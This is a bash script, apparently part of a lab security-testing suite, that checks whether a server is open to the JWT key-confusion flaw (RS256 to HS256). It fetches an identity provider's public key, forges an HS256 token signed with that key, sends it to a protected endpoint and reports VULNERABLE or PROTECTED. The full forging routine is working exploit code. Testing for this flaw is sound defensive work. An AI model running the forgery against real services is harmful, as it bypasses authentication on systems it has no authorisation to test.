#!/usr/bin/env bash
# A2 — JWT Key Confusion (RS256 → HS256)
# OWASP ASVS v4.2 § 3.5.3 — Verify JWTs specify the allowed algorithms.
# CVE-2016-5431 / CVE-2016-10555
#
# Profiles: 1A, 1C
#
# Fetches the IdP's JWKS (public key in RS256), then creates a JWT signed
# with HS256 using the public key bytes as the HMAC secret. A vulnerable
# server that only checks "alg" without enforcing RS256 will accept it.
#
# Usage:
#   bash A2_jwt_key_confusion.sh <app_url> <idp_url> [realm] [client_id] [client_secret] [username] [password]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

APP_URL="${1:?Usage: $0 <app_url> <idp_url> [realm] [client_id] [client_secret] [username] [password]}"
IDP_URL="${2:?}"
REALM="${3:-sso-lab}"
CLIENT_ID="${4:-sso-test-app}"
CLIENT_SECRET="${5:-testpass123}"
USERNAME="${6:-testuser}"
PASSWORD="${7:-password123}"

echo "[A2] JWT Key Confusion — RS256 → HS256"
echo "     App: $APP_URL  |  IdP: $IDP_URL  |  Realm: $REALM"
echo

# ── Step 1: Obtain a valid id_token and extract payload ──────────────────────
echo "  [1] Obtaining valid id_token via ROPC..."
TOKEN=$(get_id_token "$IDP_URL" "$REALM" "$CLIENT_ID" "$CLIENT_SECRET" "$USERNAME" "$PASSWORD")

if [[ -z "$TOKEN" ]]; then
  echo "      FAILED — could not obtain id_token"
  echo
  echo "SKIPPED"
  exit 0
fi

IFS='.' read -r _ payload_b64 _ <<< "$TOKEN"
PAYLOAD_JSON=$(b64url_decode "$payload_b64")

echo "      Got token, payload: ${PAYLOAD_JSON:0:80}…"
echo

# ── Step 2: Fetch JWKS / public key ──────────────────────────────────────────
JWKS_URL="${IDP_URL%/}/realms/${REALM}/protocol/openid-connect/certs"
echo "  [2] Fetching JWKS from $JWKS_URL"

JWKS_JSON=$(rcurl -sk "$JWKS_URL" 2>/dev/null || true)

if [[ -z "$JWKS_JSON" ]]; then
  echo "      FAILED — could not fetch JWKS"
  echo
  echo "SKIPPED"
  exit 0
fi

# Extract first RSA public key (n + e)
RSA_N=$(echo "$JWKS_JSON" | python3 -c "
import sys, json, base64
jwks = json.load(sys.stdin)
key = jwks['keys'][0]
print(key['n'])
" 2>/dev/null)

RSA_E=$(echo "$JWKS_JSON" | python3 -c "
import sys, json
jwks = json.load(sys.stdin)
key = jwks['keys'][0]
print(key.get('e', 'AQAB'))
" 2>/dev/null)

if [[ -z "$RSA_N" ]]; then
  echo "      FAILED — could not extract RSA key from JWKS"
  echo
  echo "SKIPPED"
  exit 0
fi

echo "      Got RSA modulus (${#RSA_N} chars), exponent: $RSA_E"
echo

# ── Step 3: Forge HS256 token signed with the RSA public key ────────────────
# Build the forged header + payload, sign with HMAC-SHA256 using the RSA
# public key as the shared secret.

FORGED_TOKEN=$(python3 << PYEOF
import hmac, hashlib, base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s: str) -> bytes:
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

# Forge header claiming HS256
header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())

# Use original payload
payload_b64 = """$payload_b64"""

# The RSA public key modulus is used as the HMAC secret
n_b64 = """$RSA_N"""
e_b64 = """$RSA_E"""

# Reconstruct DER-encoded public key from n and e to use as HMAC secret
n_bytes = b64url_decode(n_b64)
e_bytes = b64url_decode(e_b64)

# Build a minimal DER-encoded RSA public key (PKCS#1 RSAPublicKey)
def int_to_der_len(length):
    if length < 128:
        return bytes([length])
    elif length < 256:
        return bytes([0x81, length])
    else:
        return bytes([0x82, (length >> 8) & 0xff, length & 0xff])

def encode_integer(value_bytes):
    # Ensure positive encoding
    if value_bytes[0] & 0x80:
        value_bytes = b'\x00' + value_bytes
    return b'\x02' + int_to_der_len(len(value_bytes)) + value_bytes

def encode_sequence(data):
    return b'\x30' + int_to_der_len(len(data)) + data

rsa_pubkey_der = encode_sequence(
    encode_integer(n_bytes) + encode_integer(e_bytes)
)

signing_input = f"{header}.{payload_b64}".encode()
signature = hmac.new(rsa_pubkey_der, signing_input, hashlib.sha256).digest()
sig_b64 = b64url(signature)

print(f"{header}.{payload_b64}.{sig_b64}")
PYEOF
)

echo "  [3] Forged HS256 token (signed with RSA pubkey as secret):"
echo "      ${FORGED_TOKEN:0:80}…"
echo

# ── Step 4: Test forged token against protected endpoint ────────────────────
RESP_FILE="/tmp/a2_response_$$.txt"
STATUS=$(rcurl -sk -o "$RESP_FILE" -w "%{http_code}" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  "${APP_URL%/}/protected" 2>/dev/null || echo "000")

BODY_PREVIEW=$(head -c 200 "$RESP_FILE" 2>/dev/null || true)
rm -f "$RESP_FILE"

echo "  [4] GET /protected with HS256-forged token → HTTP $STATUS"
[[ -n "$BODY_PREVIEW" ]] && echo "      Response: $BODY_PREVIEW"
echo

# Also test with original RS256 token for baseline
STATUS_VALID=$(rcurl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  "${APP_URL%/}/protected" 2>/dev/null || echo "000")
echo "  [baseline] Valid RS256 token → HTTP $STATUS_VALID"
echo

# ── Verdict ──────────────────────────────────────────────────────────────────
if [[ "$STATUS" == "200" ]]; then
  echo "VULNERABLE — server accepted HS256-forged token (key confusion attack succeeded)"
else
  echo "PROTECTED  — server rejected the HS256-forged token (HTTP $STATUS)"
fi
